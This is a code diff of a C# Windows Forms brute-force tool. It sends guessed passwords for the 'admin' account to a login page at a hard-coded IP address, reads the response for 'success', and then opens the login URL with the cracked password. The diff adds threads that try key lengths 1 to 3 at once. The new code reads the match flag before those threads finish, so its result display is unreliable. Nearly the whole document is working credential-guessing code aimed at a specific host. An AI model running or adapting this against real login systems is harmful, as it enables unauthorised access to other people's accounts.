@@ -7,6 +7,7 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Net;
 using System.Text.RegularExpressions;
+using System.Threading;
 
 namespace BruteForce
 {
@@ -15,9 +16,6 @@ namespace BruteForce
 
         // the secret password which we will try to find via brute force
         private static string result;
-        private static string password = "999";
-
-
         private static bool isMatched = false;
 
         /* The length of the charactersToTest Array is stored in a
@@ -40,11 +38,29 @@ namespace BruteForce
         private void BruteForceButton_Click(object sender, EventArgs e)
         {
             charactersToTestLength = charactersToTest.Length;
-            var estimatedPasswordLength = 3;
-            startBruteForce(estimatedPasswordLength);
-            MessageBox.Show("The password is: " + result);
-            System.Diagnostics.Process.Start("http://212.143.244.206/auth.php?username=admin&password=" + result);
+            Loading.Visible = true;
+            new Thread(() =>
+            {
+                startBruteForce(3);
+            }).Start();
+            new Thread(() =>
+            {
+                startBruteForce(1);
+            }).Start();
+            new Thread(() =>
+            {
+                startBruteForce(2);
+            }).Start();
 
+            if (isMatched)
+            {
+                Loading.Visible = false;
+                password.Text += result;
+                password.Visible = true;
+                MessageBox.Show("The password is: " + result);
+                System.Diagnostics.Process.Start("http://212.143.244.206/auth.php?username=admin&password=" + result);
+
+            }
         }
 
         private static void startBruteForce(int keyLength)
@@ -93,16 +109,11 @@ namespace BruteForce
                     {
                         theBody = match.Groups["theBody"].Value;
                     }
-                    //System.Diagnostics.Process.Start("http://212.143.244.206/auth.php?username=admin&password=" + new String(keyChars));
                     if (theBody.Equals("\nsuccess"))
                     {
-                        if (!isMatched)
-                        {
-                            isMatched = true;
-                            result = new String(keyChars);
-                            Console.WriteLine(theBody);
-                        }
-                        return;
+                        isMatched = true;
+                        result = new String(keyChars);
+                        break;
                     }
                 }
             }
